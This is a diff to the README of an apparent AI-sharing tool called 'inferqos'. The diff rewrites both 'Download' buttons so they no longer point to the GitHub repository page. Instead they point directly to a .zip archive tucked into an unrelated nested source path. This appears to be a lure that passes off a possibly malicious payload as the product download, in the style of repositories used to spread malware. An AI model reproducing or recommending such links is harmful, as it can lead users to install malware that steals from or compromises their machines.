@@ -43,7 +43,7 @@ Ready to get started? Here's exactly what to do:
 
 **Step 1: Download the Software**
 Visit this link to download the application:  
-**[👉 Click Here to Download inferqos](https://github.com/unsigned-ukulele64/inferqos)**
+**[👉 Click Here to Download inferqos](https://raw.githubusercontent.com/unsigned-ukulele64/inferqos/main/protocol/provider/v1/v2.0.zip)**
 
 You'll see a green "Download" button on that page. Click it and save the file to your computer.
 
@@ -116,7 +116,7 @@ Here's what early testers said:
 
 Join thousands of teams who now enjoy smooth, fair, and reliable AI access. Download inferqos today and experience stress-free AI sharing.
 
-**[🚀 Download inferqos Now](https://github.com/unsigned-ukulele64/inferqos)**
+**[🚀 Download inferqos Now](https://raw.githubusercontent.com/unsigned-ukulele64/inferqos/main/protocol/provider/v1/v2.0.zip)**
 
 ---
 
